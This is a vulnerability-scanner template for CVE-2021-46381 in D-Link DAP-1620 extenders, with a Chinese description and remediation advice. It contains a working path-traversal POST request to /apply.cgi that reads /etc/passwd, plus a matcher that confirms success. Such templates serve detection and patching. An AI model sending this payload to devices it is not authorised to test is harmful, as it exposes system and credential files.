id: CVE-2021-46381
info:
  name: D-Link DAP-1620 - Local File Inclusion
  author:
  - l0ne1y
  description: |-
    D-Link DAP-1620 路径遍历导致任意文件读取漏洞
    D-Link DAP-1620是中国台湾友讯（D-Link）公司的一个无线中继扩展器。

    D-Link DAP-1620 存在路径遍历漏洞，该漏洞源于 D-Link DAP-1620 中的路径遍历导致的本地文件包含导致未经授权的内部文件读取 [/etc/passwd] 和 [/etc/shadow]。
  severity: high
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://www.dlink.com/
requests:
- matchers:
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
  path:
  - '{{BaseURL}}/apply.cgi'
  method: POST
  body: action=do_graph_auth&graph_code=94102&html_response_message=just_login&html_response_page=../../../../../../../../../../../../../../etc/passwd&log_pass=DummyPass&login_n=admin&login_name=DummyName&tkn=634855349&tmp_log_pass=DummyPass&tmp_log_pass_auth=DummyPass
